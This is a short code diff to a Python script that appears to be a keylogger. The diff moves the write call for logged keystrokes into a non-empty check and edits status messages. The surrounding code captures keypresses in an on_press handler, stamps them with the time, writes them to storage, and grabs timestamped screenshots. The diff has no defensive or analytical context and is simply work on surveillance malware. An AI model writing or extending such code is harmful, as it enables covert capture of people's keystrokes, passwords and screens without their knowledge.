@@ -10,10 +10,11 @@ def store_data():
     timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
     l="["+timestamp+"]:"+text
     if text!="":
-        print("ok")
+        write_1(str(l))
+        print("change")
     else:
-        print("not ok")
-    write_1(str(l))
+        print("not change")
+    
     screenshot = ImageGrab.grab()
     file_name = time.strftime("%d_%m_%Y_%H_%M_%S") + ".png"
 
@@ -41,7 +42,7 @@ def on_press(key):
         text+=" [Ctrl-R] "
     elif str(key) == "<96>":
         text+="0"
-    #<98><99><100><101><102><103><104><105><96>
+    
     elif str(key) == "<97>":
         text+="1"
     elif str(key) == "<98>":
